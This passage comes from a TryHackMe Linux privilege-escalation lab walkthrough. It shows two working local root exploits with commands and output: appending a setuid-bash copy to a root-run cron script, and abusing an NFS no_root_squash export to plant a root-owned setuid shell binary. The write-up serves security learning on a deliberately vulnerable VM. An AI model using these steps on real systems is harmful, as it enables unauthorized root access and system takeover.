TCM@debian:~$ rm /home/user/overwrite.sh 
TCM@debian:~$ echo 'cp /bin/bash /tmp/bash3; chmod +s /tmp/bash3' >> /usr/local/bin/overwrite.sh
TCM@debian:~$ ls -l /tmp/bash3
-rwsr-sr-x 1 root root 926536 Mar 15 09:25 /tmp/bash3
TCM@debian:~$ 
```

#### Trigger the new root bash binary

```bash
TCM@debian:~$ /tmp/bash3 -p
bash3-4.1# id
uid=1000(TCM) gid=1000(user) euid=0(root) egid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)
bash3-4.1# exit
exit
TCM@debian:~$ 
```

---------------------------------------------------------------------------------------

### Task 19: NFS Root Squashing

#### Detection

Linux VM

1. In command line type: `cat /etc/exports`
2. From the output, notice that “no_root_squash” option is defined for the “/tmp” export.

#### Exploitation

Attacker VM

1. Open command prompt and type: `showmount -e 10.113.169.236`
2. In command prompt type: `mkdir /tmp/1`
3. In command prompt type: `mount -o rw,vers=2 10.113.169.236:/tmp /tmp/1`

In command prompt type: `echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/1/x.c`

4. In command prompt type: `gcc /tmp/1/x.c -o /tmp/1/x`
5. In command prompt type: `chmod +s /tmp/1/x`

Linux VM

1. In command prompt type: `/tmp/x`
2. In command prompt type: `id`

---------------------------------------------------------------------------------------

#### Check for the NFS share

```bash
TCM@debian:~$ cat /etc/exports 
# /etc/exports: the access control list for filesystems which may be exported
#               to NFS clients.  See exports(5).
#
# Example for NFSv2 and NFSv3:
# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
#
# Example for NFSv4:
# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
#

/tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)

#/tmp *(rw,sync,insecure,no_subtree_check)

TCM@debian:~$ 
```

#### Mount the share

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Medium/Linux_PrivEsc_Arena]
└─$ showmount -e 10.113.169.236
Export list for 10.113.169.236:
/tmp *

┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Medium/Linux_PrivEsc_Arena]
└─$ sudo mount -o rw,vers=2 10.113.169.236:/tmp /mnt/mount_pt
[sudo] password for kali: 
mount.nfs: requested NFS version or transport protocol is not supported for /mnt/mount_pt

┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Medium/Linux_PrivEsc_Arena]
└─$ sudo mount -o rw,vers=3 10.113.169.236:/tmp /mnt/mount_pt
Created symlink '/run/systemd/system/remote-fs.target.wants/rpc-statd.service' → '/usr/lib/systemd/system/rpc-statd.service'.
```

#### Compile exploit on target machine

```bash
TCM@debian:~$ echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/x.c
TCM@debian:~$ gcc /tmp/x.c -o /tmp/x
TCM@debian:~$ 
```

#### Fix permissions on attacker Kali machine

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Medium/Linux_PrivEsc_Arena]
└─$ sudo chown root:root /mnt/mount_pt/x
[sudo] password for kali: 

┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Medium/Linux_PrivEsc_Arena]
└─$ sudo chmod +s /mnt/mount_pt/x

┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Medium/Linux_PrivEsc_Arena]
└─$ 
```

#### Trigger the exploit at the target machine

```bash
TCM@debian:~$ /tmp/x
root@debian:~# id
uid=0(root) gid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)
root@debian:~# exit
exit
TCM@debian:~$ 
```

---------------------------------------------------------------------------------------

For additional information, please see the references below.

## References

- [capabilities - Linux manual page](https://man7.org/linux/man-pages/man7/capabilities.7.html)
- [cat - Linux manual page](https://man7.org/linux/man-pages/man1/cat.1.html)
- [chmod - Linux manual page](https://man7.org/linux/man-pages/man1/chmod.1.html)
- [cp - Linux manual page](https://man7.org/linux/man-pages/man1/cp.1.html)
- [cron - Wikipedia](https://en.wikipedia.org/wiki/Cron)
- [crontab(5) - Linux manual page](https://man7.org/linux/man-pages/man5/crontab.5.html)
- [Dirty COW - Wikipedia](https://en.wikipedia.org/wiki/Dirty_COW)
- [Environment variable - Wikipedia](https://en.wikipedia.org/wiki/Environment_variable)
- [exports(5) - Linux manual page](https://man7.org/linux/man-pages/man5/exports.5.html)
- [file - Linux manual page](https://man7.org/linux/man-pages/man1/file.1.html)
- [find - Linux manual page](https://man7.org/linux/man-pages/man1/find.1.html)
- [gcc - Linux manual page](https://man7.org/linux/man-pages/man1/gcc.1.html)
- [getcap - Linux manual page](https://man7.org/linux/man-pages/man8/getcap.8.html)
- [grep - Linux manual page](https://man7.org/linux/man-pages/man1/grep.1.html)
- [GTFOBins - Homepage](https://gtfobins.github.io/)
- [Hashcat - Homepage](https://hashcat.net/hashcat/)
- [Hashcat - Kali Tools](https://www.kali.org/tools/hashcat/)
- [id - Linux manual page](https://man7.org/linux/man-pages/man1/id.1.html)
- [John the Ripper - Homepage](https://www.openwall.com/john/)
- [john - Kali Tools](https://www.kali.org/tools/john/)
- [linux-exploit-suggester - GitHub](https://github.com/The-Z-Labs/linux-exploit-suggester)
- [linux-exploit-suggester - Kali Tools](https://www.kali.org/tools/linux-exploit-suggester/)
- [mount - Linux manual page](https://man7.org/linux/man-pages/man8/mount.8.html)
- [mysql - Linux manual page](https://linux.die.net/man/1/mysql)
- [MySQL - Wikipedia](https://en.wikipedia.org/wiki/MySQL)
- [Network File System - Wikipedia](https://en.wikipedia.org/wiki/Network_File_System)
- [nmap - Homepage](https://nmap.org/)
- [nmap - Linux manual page](https://linux.die.net/man/1/nmap)
- [nmap - Manual page](https://nmap.org/book/man.html)
- [Nmap - Wikipedia](https://en.wikipedia.org/wiki/Nmap)
- [PATH (variable) - Wikipedia](https://en.wikipedia.org/wiki/PATH_(variable))
- [passwd - Wikipedia](https://en.wikipedia.org/wiki/Passwd)
- [passwd(1) - Linux manual page](https://man7.org/linux/man-pages/man1/passwd.1.html)
- [passwd(5) - Linux manual page](https://man7.org/linux/man-pages/man5/passwd.5.html)
- [Secure Shell - Wikipedia](https://en.wikipedia.org/wiki/Secure_Shell)
- [Setuid - Wikipedia](https://en.wikipedia.org/wiki/Setuid)
- [shadow - Linux manual page](https://man7.org/linux/man-pages/man5/shadow.5.html)
- [Shadow file - Wikipedia](https://en.wikipedia.org/wiki/Passwd#Shadow_file)
- [ssh - Linux manual page](https://man7.org/linux/man-pages/man1/ssh.1.html)
- [strace - Linux manual page](https://man7.org/linux/man-pages/man1/strace.1.html)
- [strings - Linux manual page](https://man7.org/linux/man-pages/man1/strings.1.html)
- [su - Linux manual page](https://man7.org/linux/man-pages/man1/su.1.html)
- [sudo - Linux manual page](https://man7.org/linux/man-pages/man8/sudo.8.html)
- [sudo - Wikipedia](https://en.wikipedia.org/wiki/Sudo)
